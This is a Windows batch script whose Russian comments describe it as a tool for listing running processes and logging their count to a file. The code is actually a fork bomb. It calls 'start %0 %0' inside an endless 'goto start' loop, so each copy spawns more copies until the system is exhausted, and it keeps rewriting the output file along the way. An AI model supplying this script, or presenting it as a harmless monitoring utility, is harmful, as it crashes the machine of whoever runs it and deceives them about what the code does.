@echo off

:start
rem Запускает текущую программу с теми же параметрами.
start %0 %0

rem выводит список всех запущенных процессов
tasklist | find /v /n /c ""

rem Запишите результаты в файл C:\process\output.txt.
echo. > C:\process\output.txt
tasklist | find /v /n /c "" >> C:\process\output.txt

rem Возврат к исходной точке
goto start

